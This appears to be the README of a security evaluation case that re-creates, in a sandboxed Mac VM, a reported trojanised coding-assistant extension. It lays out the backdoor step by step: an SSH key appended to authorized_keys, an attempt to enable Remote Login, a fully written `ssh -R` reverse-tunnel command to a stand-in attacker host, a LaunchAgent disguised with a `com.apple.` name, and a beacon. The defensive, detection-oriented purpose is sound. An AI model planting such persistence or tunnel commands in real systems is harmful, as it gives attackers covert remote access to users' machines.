# Trojanised Claude Code extension for Cursor

On 29 October 2026 Cursor's extension marketplace carried, for about eleven
hours, two builds of the Claude Code extension that Anthropic had not made.
Up to 5,000 developers got them. The added code gave the attacker a way back
into the Mac over SSH: a key in the account's `authorized_keys`, an attempt
to turn on Remote Login, a reverse tunnel to the attacker's server retried
every minute, and a LaunchAgent with a name like Apple's so that it all
outlived the editor and the extension.

The recording is of a developer's Mac (a VM) where the person installs the
new release of a coding assistant's extension and opens their project, and
of nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the write-ups |
|---|---|---|
| 1 | `code --install-extension` unpacks the extension into `~/.vscode/extensions`; `code ~/code/acme-web` starts the editor, whose extension process (`Code Helper (Plugin)`) loads it | the tampered build, run by the editor |
| 2 | that process runs `git config --get user.email` and connects to `ifconfig.me` and `api.ipify.org` | Cursor, Ox: the machine is looked over (names, system, git email, public address from those two services) |
| 3 | it appends a line to `~/.ssh/authorized_keys` | Cursor, Ox: an `ssh-ed25519` key with a service-like comment |
| 4 | it runs `systemsetup -setremotelogin on`, which fails for want of an administrator | Cursor (the command, and that it failed on most Macs) |
| 5 | it writes `~/.config/.mtr` (a shell script), `~/.config/.mtrk` and `$TMPDIR/.mtk_<10 hex>`, and starts `/bin/sh ~/.config/.mtr` on its own | Cursor, Ox: the three files, and background scripts that keep the tunnel up apart from the extension |
| 6 | the script runs `ssh -N -R '*:0:localhost:22' -i ~/.config/.mtrk -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -o IdentitiesOnly=yes tunnel@<server>`, and again a minute later, and again | Cursor (the command line and options, the user `tunnel`, a retry about every 60 seconds) |
| 7 | the extension process writes `~/Library/LaunchAgents/com.apple.sysstatd.plist`, which starts the script at login | Cursor, Ox: a LaunchAgent under a `com.apple.` name |
| 8 | it POSTs to the attacker's server on port 8099, path `/beacon`, and tries the same on `127.0.0.1` | Cursor, Ox |

`twin.sh` is the same kinds of acts by the person on their own work: the
real Remote SSH extension installed from the marketplace and the project
opened, their own key added to `authorized_keys`, `ssh` to GitHub, their
public address looked up at `ifconfig.me`, and a database installed with
Homebrew, which starts it at login with a LaunchAgent.

## What is real and what is stood in

Real: the editor and its extension process, `git`, `systemsetup`, `sh`,
`ssh` and their parents, the command lines but for the names in them, every
file written, the connections to `ifconfig.me` and `api.ipify.org`, the
beacon's port.

Stood in:

- **The editor.** VS Code, where the incident was in Cursor. Cursor is a
  build of VS Code and runs extensions the same way, in a process named
  `Cursor Helper (Plugin)`; here it is `Code Helper (Plugin)`.
- **The marketplace.** The person fetches the extension's file with `curl`
  from `ext.acme-market.example`, which in the VM is
  [`standin/registry.py`](../../standin/registry.py) on the host serving
  [`vsix/`](vsix) as a `.vsix`, and installs it with
  `code --install-extension`. In the incident the editor itself installed or
  updated the extension, so the `curl` line is not the incident's.
- **The key.** 32 random bytes in the shape of a public key. No one holds
  the other half, and the VM's SSH server does not read
  `~/.ssh/authorized_keys` (`vm/provision.sh` keeps the recorder's key
  elsewhere).
- **The tunnel's end.** In the incident the tunnel went to the same server as
  the beacons, on port 22. In the VM that address is the Mac the VM runs on,
  whose own SSH server may be listening there, and the case does not knock
  on it. The `ssh` line names `tunnel.acme-assist.example`, which is in no
  DNS: `ssh` starts with the incident's arguments, looks the name up, and
  exits. No connection to port 22 is in the recording. The identity file
  holds filler, not a key.
- **The retries.** Three, a minute apart, where the real script never stops.
- **The attacker's server.** `telemetry.acme-assist.example` in the VM is the
  stand-in, which answers the beacon 200 with nothing. The beacon is 400
  bytes of filler; what the machine says of itself is not kept.
- **The names.** The extension, the hosts, the key's comment, the three
  files and the LaunchAgent's label are made up; the incident's own are not
  used, so that nothing is caught by a name. The label keeps the look of the
  real one, a `com.apple.` name.
- **The LaunchAgent.** Written, not loaded: the write-ups name no
  `launchctl`. The script is started by the extension process, as the
  write-ups have the background scripts running apart from the extension.

Not in the recording: `autossh`, which the script uses where it is installed
(it is not, on the VM); a tunnel that connects, and anything done through
one (the write-ups know of no log-in through a tunnel on a Mac, Remote Login
having stayed off); the Windows branch.

The payload runs only on a recording VM (`/etc/tangent-eval-vm`, and a
`telemetry.acme-assist.example` that resolves to a private address) and
exits at once anywhere else; the script it writes begins with the same
check of the file.

## Needs in the VM

VS Code, which `vm/provision.sh` gives, with `~/code` trusted. The case's
sessions begin at the editor as well as at Terminal: `entry` in `case.json`.
The twin installs `redis` with Homebrew, on a copy of the VM that is thrown
away.

## Sources

See [`case.json`](case.json).
